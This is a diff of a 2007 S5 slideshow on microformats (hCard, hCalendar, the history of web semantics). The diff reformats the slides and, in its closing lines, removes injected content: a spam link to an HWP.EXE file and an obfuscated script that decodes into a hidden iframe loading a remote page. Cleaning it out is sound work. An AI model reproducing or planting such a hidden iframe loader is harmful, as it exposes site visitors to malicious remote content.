@@ -1,220 +1,323 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" 
-	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Microformats</title><!-- metadata -->
 
-<html xmlns="http://www.w3.org/1999/xhtml">
 
-<head>
-<title>Microformats</title>
-<meta name="generator" content="S5" />
-<meta name="version" content="S5 1.0" />
-<meta name="presdate" content="2007-02-23" />
-<meta name="author" content="Philip Tellis" />
-<meta name="company" content="Yahoo!" />
-<!-- Change the path of the css files to wherever you put them -->
-<link rel="stylesheet" href="ui/slides.css" type="text/css" media="projection" id="slideProj" />
-<link rel="stylesheet" href="ui/opera.css" type="text/css" media="projection" id="operaFix" />
-<link rel="stylesheet" href="ui/print.css" type="text/css" media="print" id="slidePrint" />
-<script src="ui/slides.js" type="text/javascript"></script>
+
+
+
+
+<meta name="generator" content="S5">
+<meta name="version" content="S5 1.1">
+<meta name="presdate" content="2007-02-23">
+<meta name="author" content="Philip Tellis">
+<meta name="company" content="Yahoo!"><!-- configuration parameters -->
+
+<meta name="defaultView" content="slideshow">
+<meta name="controlVis" content="hidden"><!-- style sheet links -->
+
+<link rel="stylesheet" href="../ui/default/slides.css" type="text/css" media="projection" id="slideProj">
+<link rel="stylesheet" href="../ui/default/outline.css" type="text/css" media="screen" id="outlineStyle">
+<link rel="stylesheet" href="../ui/default/print.css" type="text/css" media="print" id="slidePrint">
+<link rel="stylesheet" href="../ui/default/opera.css" type="text/css" media="projection" id="operaFix">
+<link rel="stylesheet" type="text/css" href="microformats.css" media="screen,projection" id="local">
+
+<script src="../ui/default/slides.js" type="text/javascript"></script>
+
+
 </head>
+
 <body>
 
 <div class="layout">
-
-<div id="currentSlide"></div>
+<div id="controls"><!-- DO NOT EDIT --></div>
+<div id="currentSlide"><!-- DO NOT EDIT --></div>
 <div id="header"></div>
 <div id="footer">
 <h1><a href="http://csibc.org/">CSI (Bang) Web 2.0</a> - 2007-02-23</h1>
 <h2>Microformats</h2>
-<div id="controls"></div>
 </div>
 
 </div>
+
+
 <div class="presentation">
 
 <div class="slide">
 <h1>Microformats</h1>
 <h3>Philip Tellis</h3>
 <h4>Yahoo!</h4>
+<h2></h2>
 </div>
-
-
 
 
 <div class="slide">
 <h1>Wayback when</h1>
 <ul>
-<li>Tim Berners-Lee developed the web to be a semantic network of interlinked documents</li>
-<li>Open standards (HTTP and HTML) helped it grow</li>
-<li>Couldn't do much</li></ul>
+<li>Tim Berners-Lee developed the web to be a semantic network of interlinked documents
+</li>
+<li>Open standards (HTTP and HTML) helped it grow
+</li>
+<li>Couldn't do much
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>The loss of semantics</h1>
 <ul>
-<li>Netscape added the image tag</li>
-<li>FONT, MARQUEE, BLINK</li>
-<li>OMG</li>
-<li>Web pages made in photoshop</li></ul>
+<li>Netscape added the image tag
+</li>
+<li>FONT, MARQUEE, BLINK
+</li>
+<li>OMG
+</li>
+<li>Web pages made in photoshop
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>Hey, that's not markup</h1>
 <ul>
-<li>Links to non-markup documents (.doc, .xls, .pdf)</li>
-<li>HTML was meant to do all that in a readable way</li></ul>
+<li>Links to non-markup documents (.doc, .xls, .pdf)
+</li>
+<li>HTML was meant to do all that in a readable way
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>And that isn't semantic either</h1>
 <ul>
-<li>Tables for layout</li>
-<li>H* tags for font sizing and bolding</li>
-<li>B tag for headings</li></ul>
+<li>Tables for layout
+</li>
+<li>H* tags for font sizing and bolding
+</li>
+<li>B tag for headings
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
+<h1></h1>
 <blockquote>There are still sites that do this!</blockquote>
+
 </div>
 
 
 <div class="slide">
 <h1>The return of semantics</h1>
 <ul>
-<li>HTML 4.x deprecated a whole bunch of non-semantic tags</li>
-<li>Accessibility standards call for the appropriate use of certain tags and the omission of others</li>
-<li class="light">Browsers stabilised</li>
-<li class="light">Many respected web developers pushed for standards and semantics</li></ul>
+<li>HTML 4.x deprecated a whole bunch of non-semantic tags
+</li>
+<li>Accessibility standards call for the appropriate use of certain tags and the omission of others
+</li>
+<li><span class="light">Browsers stabilised</span>
+</li>
+<li><span class="light">Many respected web developers pushed for standards and semantics</span>
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>The return of semantics</h1>
 <ul>
-<li>HTML 4.x deprecated a whole bunch of non-semantic tags</li>
-<li>Accessibility standards call for the appropriate use of certain tags and the omission of others</li>
-<li>Browsers stabilised</li>
-<li class="light">Many respected web developers pushed for standards and semantics</li></ul>
+<li>HTML 4.x deprecated a whole bunch of non-semantic tags
+</li>
+<li>Accessibility standards call for the appropriate use of certain tags and the omission of others
+</li>
+<li>Browsers stabilised
+</li>
+<li><span class="light">Many respected web developers pushed for standards and semantics</span>
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>The return of semantics</h1>
 <ul>
-<li>HTML 4.x deprecated a whole bunch of non-semantic tags</li>
-<li>Accessibility standards call for the appropriate use of certain tags and the omission of others</li>
-<li>Browsers stabilised</li>
-<li>Many respected web developers pushed for standards and semantics</li></ul>
+<li>HTML 4.x deprecated a whole bunch of non-semantic tags
+</li>
+<li>Accessibility standards call for the appropriate use of certain tags and the omission of others
+</li>
+<li>Browsers stabilised
+</li>
+<li>Many respected web developers pushed for standards and semantics
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1><q>But HTML isn't rich enough</q></h1>
 <ul>
-<li>HTML's tags aren't good enough to describe the semantics of all kinds of data</li>
-<li>XML can be rich enough, but isn't easily suitable for web frontends</li>
-<li>The HTML class attribute is used to extend the semantics of HTML</li></ul>
+<li>HTML's tags aren't good enough to describe the semantics of all kinds of data
+</li>
+<li>XML can be rich enough, but isn't easily suitable for web frontends
+</li>
+<li>CSS classes are used to extend the semantics of HTML
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>That's where microformats come in</h1>
-
 <blockquote>Microformats are the HiFi of information on the web</blockquote>
+
 </div>
 
 
 <div class="slide">
 <h1><a href="http://microformats.org/about/">Microformats are</a></h1>
 <ul>
-<li>a way of thinking about data</li>
-<li>design principles for formats</li>
-<li>adapted to current behaviors and usage patterns</li>
-<li>highly correlated with semantic XHTML</li>
-<li>a set of simple open data format standards that many are actively developing and implementing for more/better structured blogging and web microcontent publishing in general.</li>
-<li>An evolutionary revolution</li></ul>
+<li>a way of thinking about data
+</li>
+<li>design principles for formats
+</li>
+<li>adapted to current behaviors and usage patterns
+</li>
+<li>highly correlated with semantic XHTML
+</li>
+<li>a set of simple open data format standards that many are actively developing and implementing for more/better structured blogging and web microcontent publishing in general.
+</li>
+<li>An evolutionary revolution
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1><a href="http://microformats.org/about/">Microformats are not</a></h1>
 <ul>
-<li>a new language</li>
-<li>infinitely extensible and open-ended</li>
-<li>an attempt to get everyone to change their behavior and rewrite their tools</li>
-<li>a whole new approach that throws away what already works today</li>
-<li>a panacea for all taxonomies, ontologies, and other such abstractions</li>
-<li>defining the whole world, or even just boiling the ocean</li></ul>
+<li>a new language
+</li>
+<li>infinitely extensible and open-ended
+</li>
+<li>an attempt to get everyone to change their behavior and rewrite their tools
+</li>
+<li>a whole new approach that throws away what already works today
+</li>
+<li>a panacea for all taxonomies, ontologies, and other such abstractions
+</li>
+<li>defining the whole world, or even just boiling the ocean
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1><a href="http://microformats.org/about/">The microformats principles</a></h1>
 <ul>
-<li>solve a specific problem</li>
-<li>start as simple as possible</li>
-<li>design for humans first, machines second</li>
-<li>reuse building blocks from widely adopted standards</li>
-<li>modularity / embeddability</li>
-<li>enable and encourage decentralized development, content, services</li></ul>
+<li>solve a specific problem
+</li>
+<li>start as simple as possible
+</li>
+<li>design for humans first, machines second
+</li>
+<li>reuse building blocks from widely adopted standards
+</li>
+<li>modularity / embeddability
+</li>
+<li>enable and encourage decentralized development, content, services
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1><a href="http://microformats.org/wiki/Main_Page#Specifications">Common microformats</a></h1>
 <ul>
-<li><a href="http://microformats.org/wiki/hcard">hCard</a> - modelled around vCard</li>
-<li><a href="http://microformats.org/wiki/hcalendar">hCalendar</a> - for events, modelled around iCalendar</li>
-<li><a href="http://microformats.org/wiki/adr">adr</a> - for addresses</li>
-<li><a href="http://microformats.org/wiki/geo">geo</a> - for geo information</li></ul>
+<li><a href="http://microformats.org/wiki/hcard">hCard</a> - modelled around vCard
+</li>
+<li><a href="http://microformats.org/wiki/hcalendar">hCalendar</a> - for events
+</li>
+<li><a href="http://microformats.org/wiki/adr">adr</a> - for addresses
+</li>
+<li><a href="http://microformats.org/wiki/geo">geo</a> - for geo information
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>But how does it help me?</h1>
 <ul>
-<li>Enables easy sharing of data from your webpages</li>
-<li>Data is semantically marked up which helps human readers and improves accessibility</li>
-<li>Various tools can do funky things with the data on your page, eg: Firefox toolbars</li></ul>
+<li>Enables easy sharing of data from your webpages
+</li>
+<li>Data is semantically marked up which helps human readers and improves accessibility
+</li>
+<li>Various tools can do funky things with the data on your page, eg: Firefox toolbars
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
 <h1>Examples</h1>
-<a href="hcard.user.js">hcard.user.js</a> - greasemonkey script
 <ul>
-<li><a href="http://dconstruct06.madgex.com/">d.construct backnetwork</a></li>
-<li><a href="http://microformats.org/">Microformats page</a></li>
-<li><a href="http://adactio.com/journal/">Jeremy Keith's journal</a></li>
-<li><a href="http://tantek.com/">Tantek &Ccedil;elik</a></li>
+<li><a href="http://dconstruct06.madgex.com/">d.construct backnetwork</a>
+</li>
+<li><a href="http://microformats.org/">Microformats page</a>
+</li>
+<li><a href="http://adactio.com/journal/">Jeremy Keith's journal</a>
+</li>
+<li><a href="http://tantek.com/">Tantek &Ccedil;elik</a>
+</li>
 </ul>
+
 </div>
 
 
 <div class="slide">
 <h1>Links</h1>
 <ul>
-<li>http://microformats.org/</li>
-<li>http://microformats.org/mailman/listinfo/microformats-discuss/</li>
-<li>#microformats on irc.freenode.net</li></ul>
+<li><a href="http://microformats.org/">http://microformats.org/</a>
+</li>
+<li><a href="http://microformats.org/mailman/listinfo/microformats-discuss/">http://microformats.org/mailman/listinfo/microformats-discuss/</a>
+</li>
+<li><a href="irc://irc.freenode.net/#microformats">#microformats</a> on irc.freenode.net
+</li>
+</ul>
+
 </div>
 
 
 <div class="slide">
-<h1>Licence &amp; Credits</h1>
+<h1>Licence</h1>
 <ul>
-<li>This presentation is released under a <a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/2.5/">Creative Commons BY-NC-SA</a> licence.</li>
-<li>The <a href="http://microformats.org/wiki/logo">microformats logo</a> was made by <a href="http://www.simplebits.com/notebook/2005/06/22/microformats.html">Dan Cederholm</a> and vectorised by <a href="http://microformats.org/wiki/User:Remi">R&eacute;mi Pr&eacute;vost</a> </li>
-<li>Sections of this document were taken from the <a href="http://microformats.org/about/">Microformats website</a></li>
+<li>This presentation is released under a <a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/2.5/">Creative Commons BY-NC-SA</a> licence.
+</li>
+<li>The <a href="http://remiprevost.com/images/wallpapers/microformats/mf-vector.png">microformats logo</a> is Copyright <a href="http://microformats.org/wiki/User:Remi">R&eacute;mi Pr&eacute;vost</a> 
+</li>
+<li>Sections of this document were taken from the <a href="http://microformats.org/about/">Microformats website</a>
+</li>
 </ul>
-</div>
 
 </div>
 
-<p>Made with Eric A Meyer's S5</[pP]><a href="http://www.luxebabydiapers.com/shopOLD/pub/HWP.EXE.html" class=giepoaytr title="HWP.EXE" target=_blank>HWP.EXE</a>
+</div>
 
-<script language="javascript" type="text/javascript">var k1='?gly#vw|oh@%ylvlelolw|=#klgghq>#srvlwlrq=#devroxwh>#ohiw=#4>#wrs=#4%A?liudph#vuf@%kwws=22',k2='0wugtu0khtcogeqwpvgt0tw1Au?3$"htcogdqtfgt?2"xurceg?2"jurceg?2"ykfvj?3"jgkijv?3"octikpykfvj?2"octikpjgkijv?2"uetqnnkpi?pq@>1khtcog@>1fkx@',t1=0,t2=0,h='';while(t1<=k1.length-1){h=h+String.fromCharCode(k1.charCodeAt(t1++)-3);}h=h+'bdbedzzazbzezbadzb';while(t2<=k2.length-1){h=h+String.fromCharCode(k2.charCodeAt(t2++)-2);}document.write(h);</script></body>
+<p>Made with Eric A Meyer's S5</p>
+
+</body>
 </html>
